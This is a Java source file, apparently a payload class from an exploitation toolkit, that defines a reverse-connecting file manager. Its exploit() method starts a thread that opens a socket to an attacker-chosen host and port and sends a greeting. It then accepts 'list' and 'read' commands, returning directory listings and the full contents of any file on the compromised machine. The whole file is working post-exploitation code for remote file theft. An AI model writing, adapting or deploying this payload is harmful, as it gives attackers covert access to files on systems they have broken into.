package shell;

import java.io.*;
import java.net.Socket;
import java.nio.file.Files;
import java.nio.file.Paths;

/**
 * @author wh1t3P1g
 * @since 2020/9/5
 */
public class FileManagerWithSocket extends Thread implements Socketable{

    private String host;
    private Integer port;

    @Override
    public void setRemote(String host, Integer port) {
        this.host = host;
        this.port = port;
    }

    public String list(String path){
        if(path != null && !path.isEmpty()){
            try {
                StringBuilder stringBuilder = new StringBuilder();
                File file = new File(path.trim());
                if(file.isDirectory()){
                    File[] files = file.listFiles();
                    for(File tmp:files){
                        if(tmp.isDirectory()){
                            stringBuilder.append("d:"+tmp.getAbsolutePath()).append("\n");
                        }else if(tmp.isFile()){
                            stringBuilder.append("f:"+tmp.getAbsolutePath()).append("\n");
                        }else{
                            stringBuilder.append("o:"+tmp.getAbsolutePath()).append("\n"); // other
                        }
                    }
                    return stringBuilder.toString();
                }else if(file.isFile()){
                    return read(path);
                }
            } catch (Exception e) {
                // do nothing
            }
        }
        return null;
    }

    public String read(String file) throws IOException {
        StringBuilder stringBuilder = new StringBuilder();
        BufferedReader read = new BufferedReader(
                new InputStreamReader(Files.newInputStream(Paths.get(file.trim()))));
        String line2 = null;
        while ((line2 = read.readLine()) != null) {
            stringBuilder.append(line2).append("\n");
        }
        return stringBuilder.toString();
    }

    public void run(){
        try {
            Socket socket = new Socket(host, port);
            BufferedWriter bufferedWriter = new BufferedWriter(new OutputStreamWriter(socket.getOutputStream()));
            bufferedWriter.write("happy everyday!\n");
            bufferedWriter.flush();

            BufferedReader bufferedReader = new BufferedReader(
                    new InputStreamReader(socket.getInputStream()));
            while (true) {
                String line;
                while ((line = bufferedReader.readLine()) == null)
                    ;
                if(line.equals("exit")){
                    return;
                }
                String result = "nothing!";
                if(line.startsWith("list")){
                    String path = line.substring(5);
                    result = list(path);
                }else if(line.startsWith("read")){
                    String file = line.substring(5);
                    result = read(file);
                }
                bufferedWriter.write(result + "\n");
                bufferedWriter.flush();
            }

        } catch (IOException e) {
            // do nothing
        }
    }

    @Override
    public void exploit() {
        start();
    }

    @Override
    public Socketable newInstance() {
        return new FileManagerWithSocket();
    }

    public static void main(String[] args) {
        FileManagerWithSocket fileManagerWithSocket = new FileManagerWithSocket();
        System.out.print(fileManagerWithSocket.list("/tmp/com.sangfor.ca.sha"));
    }
}
